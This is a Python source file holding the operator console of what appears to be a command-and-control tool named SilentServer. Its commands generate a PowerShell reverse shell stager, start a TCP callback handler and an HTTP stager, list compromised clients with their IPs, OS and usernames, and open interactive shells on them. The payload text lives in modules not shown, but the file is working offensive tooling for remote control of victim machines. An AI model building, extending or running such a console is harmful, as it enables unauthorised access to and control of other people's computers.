from core.SilentServer   import SilentServer
from core.HttpServer     import HTTPServer
from core.ClientHandler  import ClientHandler

import os
import core.TextAssets

class CommandHandler:
        def __init__(self, silent_server: object, http_server: object) -> None:
                self.silent_server      = silent_server
                self.http_server        = http_server
                self.commands           = {
                        "shell" : {
                                "min_args" : 1,
                                "max_args" : 1,
                                "function" : self.shell,
                                "descript" : """
                                \r shell [client_id]   : Enter into a shell with a given client ID.
                                \r                       Find all current client IDs using 'sessions'.
                                """
                        },
                        "sessions" : {
                                "min_args" : 0,
                                "max_args" : 0,
                                "function" : self.sessions,
                                "descript" : """
                                \r sessions            : Lists all currently connected clients with
                                \r                       their respective IDs, IPs, OS, Username, and
                                \r                       current connectivity status.
                                """
                        },
                        "generate" : {
                                "min_args" : 0,
                                "max_args" : 1,
                                "function" : self.generate,
                                "descript" : """
                                \r generate [+]        : Generates a powershell reverse shell stager
                                \r                       payload by default. Can generate: [encode],
                                \r                       [raw], [http]
                                """
                        },
                        "jobs" : {
                                "min_args" : 0,
                                "max_args" : 0,
                                "function" : self.jobs,
                                "descript" : """
                                \r jobs                : Lists current services running.
                                """
                        },
                        "start" : {
                                "min_args" : 3,
                                "max_args" : 4,
                                "function" : self.start,
                                "descript" : """
                                \r start [service] [+] : Starts a service with given optional parameters.
                                \r                       Ex:
                                \r                       start [handler|stager] [callback_address] [listen_port] [dwell_time]
                                """
                        },
                        "stop" : {
                                "min_args" : 1,
                                "max_args" : 1,
                                "function" : self.stop,
                                "descript" : """
                                \r stop [service]      : Stops a given service [handler|stager].
                                """
                        },
                        "kill" : {
                                "min_args" : 1,
                                "max_args" : 1,
                                "function" : self.kill,
                                "descript" : """
                                \r kill [client_id]   : Terminates client connection with given client ID.
                                """
                        },
                        "help" : {
                                "min_args" : 0,
                                "max_args" : 1,
                                "function" : self.get_help,
                                "descript" : """
                                \r help [+]           : Displays unique help menu to a specific command.
                                """
                        },
                        "clear" : {
                                "min_args" : 0,
                                "max_args" : 0,
                                "function" : self.clear,
                                "descript" : """
                                \r clear              : Clears the terminal.
                                """
                        },
                        "exit" : {
                                "min_args" : 0,
                                "max_args" : 0,
                                "function" : self.done,
                                "descript" : """
                                \r exit               : Gracefully shuts down services and closes any
                                \r                      client connections.
                                """
                        }
                }

        def validate(self, command: str, num_args: int) -> bool:
                if command not in self.commands.keys():
                        self.not_found()
                        return False

                if self.commands[command]["min_args"] > num_args:
                        self.wrong_args()
                        return False

                if self.commands[command]["max_args"] < num_args:
                        self.wrong_args()
                        return False

                return True

        def handle_input(self, user_input: str) -> None:
                if not user_input:
                        return

                user_input              = user_input.lower().split()
                command                 = user_input[0]
                num_args                = len(user_input) - 1

                if not self.validate(command, num_args):
                        return

                max_args                = self.commands[command]["max_args"]

                if not max_args:
                        self.commands[command]["function"]()
                        return

                args                    = user_input[1:]

                self.commands[command]["function"](*args)

        def shell(self, client_id: str) -> None:
                client_id               = client_id.upper()

                if not self.silent_server.clients:
                        print("No sessions established.")
                        return

                active_clients          = []

                for client in self.silent_server.clients:
                        if client.client_status == "Active":
                                active_clients.append(client)

                if len(active_clients) == 0:
                        print("No active sessions.")
                        return

                FOUND                   = False

                for client in self.silent_server.clients:
                        if client.client_id == client_id:
                            FOUND       = True
                            break

                if not FOUND:
                        print("Client doesn't exist.")
                        return

                self.silent_server.in_comm = True
                client.client_usage     = "Yes"
                client_handler          = ClientHandler(client)
                client_handler.begin_comm()
                self.silent_server.in_comm = False
                client.client_usage     = "No"
                
        def sessions(self) -> None:
                if self.silent_server.clients:
                        core.TextAssets.print_clients(self.silent_server.clients)

                else:
                        print("No sessions established.")

        # TODO:
        # Add options for encoded, raw, http

        def generate(self, payload: str = "encoded") -> None:
                if not self.silent_server.listener:
                        return

                core.TextAssets.print_info("Generating payload ...")
                payload         = self.silent_server.get_payload()
                payload         = core.TextAssets.make_gray(payload)
                print(payload)

        def jobs(self) -> None:
                if not self.silent_server.listener and not self.http_server.listener:
                        print("No jobs running.")
                        return

                jobs                    = []
                jobs.append(("TCP Handler", str(self.silent_server.callback_port), bool(self.silent_server.server_thread)))
                jobs.append(("HTTP Stager", str(self.http_server.listen_port),     bool(self.http_server.server_thread)))
                core.TextAssets.print_jobs(jobs)

        def start(self, job: str, callback_address: str, port: str, dwell_time: str = 2) -> None:
                if not (job or callback_address or port):
                        return

                port                    = int(port)

                if job == "handler":
                        if self.silent_server.listener:
                                print("Server already active.")
                                return

                        self.silent_server = SilentServer(callback_address, port, dwell_time)
                        
                        if self.silent_server.initialize_server():
                                core.TextAssets.print_success()

                if job == "stager":
                        if self.http_server.listener:
                                print("Server already active.")
                                return

                        callback_port    = self.silent_server.callback_port
                        self.http_server = HTTPServer(callback_address, port, callback_port)
                        
                        if self.http_server.initialize_server():
                                core.TextAssets.print_success()

        def stop(self, job: str) -> None:
                if job == "handler":
                        if self.silent_server.shutdown():
                                core.TextAssets.print_success()
                                return

                if job == "stager":
                        if self.http_server.shutdown():
                                core.TextAssets.print_success()
                                return


        def kill(self, client_id: str) -> None:
                client_id               = client_id.upper()

                if not self.silent_server.clients:
                        print("No sessions established.")
                        return

                active_clients          = []

                for client in self.silent_server.clients:
                        if client.client_status == "Active":
                                active_clients.append(client)

                if len(active_clients) == 0:
                        print("No active sessions.")
                        return

                FOUND                   = False

                for client in self.silent_server.clients:
                        if client.client_id == client_id:
                            FOUND       = True
                            break

                if not FOUND:
                        print("Client doesn't exist.")
                        return

                client.client.close()
                core.TextAssets.print_success()

        def get_help(self, command: str = None) -> None:
                if not command:
                        core.TextAssets.get_help()
                        return

                if command not in self.commands.keys():
                        self.not_found()
                        return

                description             = self.commands[command]["descript"]
                core.TextAssets.get_command_help(description)

        def clear(self) -> None:
                if os.name == "nt":
                        os.system("cls")
                        return

                os.system("clear")

        def done(self) -> None:
                raise Exception("Exitting ...")

        def not_found(self) -> None:
                print("Command not recognized.")

        def wrong_args(self) -> None:
                print("Command needs correct arguments.")